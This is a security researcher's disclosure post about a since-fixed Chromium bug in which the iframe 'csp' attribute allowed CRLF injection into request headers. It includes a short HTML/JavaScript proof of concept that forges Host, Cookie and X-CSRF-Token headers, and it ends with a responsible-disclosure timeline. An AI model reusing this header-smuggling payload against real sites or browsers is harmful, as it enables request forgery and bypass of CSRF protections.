---
title: "Setting arbitrary request headers in Chromium via CRLF injection"
date: "2018-06-20"
---

In this short note I'll describe a bug I found in Chrome recently. It allowed to set arbitrary headers in cross-domain requests. [@insertScript](https://insert-script.blogspot.co.at/2018/05/adobe-reader-pdf-client-side-request.html) recently found a very similar bug in Adobe Reader plugin but it turns out you can still expect those bugs in browsers themselves.

Why is it serious? Because you can use it to inject any request headers, including ones on which security decisions are based, like `X-CSRF-Token`, `Host`, `Referer` or `Cookie`.

### Technical details

I recently stumbled upon a new property of `<iframe>` element I've not been aware of before. The property is called `csp`.  As you can guess, it accepts a CSP policy. Let's check it:

[![](https://3.bp.blogspot.com/-0UTA75NdymQ/Wwj6GJ5TiXI/AAAAAAAAANc/D-T773dYDKYbzk_a2ASTeHcOLkE2002LACLcBGAs/s400/csp.png)](https://3.bp.blogspot.com/-0UTA75NdymQ/Wwj6GJ5TiXI/AAAAAAAAANc/D-T773dYDKYbzk_a2ASTeHcOLkE2002LACLcBGAs/s1600/csp.png)

So what does it actually do? When you set src for the iframe, the following request will be generated:

    GET / HTTP/1.1
    Host: www.google.com
    upgrade-insecure-requests: 1
    sec-required-csp: script-src google.com
    user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    accept-encoding: gzip, deflate, br
    accept-language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
    cookie: [...]

There's a new `Sec-Required-CSP` header whose value is equal to the csp attribute set earlier. The name of the header makes it easy to google that we're dealing with [CSP Embedded Enforcement](https://w3c.github.io/webappsec-csp/embedded/). In short, it is a mechanism for web developers that they can ask nicely embedded content for a specific CSP policy. The embedded content may accept it or reject; in the second case the page won't be rendered.

Anyway, going back to the `csp` attribute: since its value is reflected in request header, it basically calls for CRLF injection. Let's try it:

```html
<!DOCTYPE html><meta charset="utf-8" /> .
<script>
  const ifr = document.createElement("iframe");
  ifr.src = "http://bntk.pl/";
  ifr.csp =
    "script-src\r\nX-CSRF-Token: 1234\r\nUser-Agent: Firefox\r\nCookie: abc\r\nHost: absolutely-random-host.google";

  document.body.appendChild(ifr);
</script>
```

And it generated a request:

    GET / HTTP/1.1
    Host: absolutely-random-host.google
    Connection: keep-alive
    Upgrade-Insecure-Requests: 1
    Sec-Required-CSP: script-src
    X-CSRF-Token: 1234
    User-Agent: Firefox
    Cookie: abc
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7

This was pretty bad!

### Timeline

- May 23 - [bug reported](https://bugs.chromium.org/p/chromium/issues/detail?id=845961)
- May 25 - bug fixed
- June 6 - fixed in stable Chrome
- June 20 - disclosure
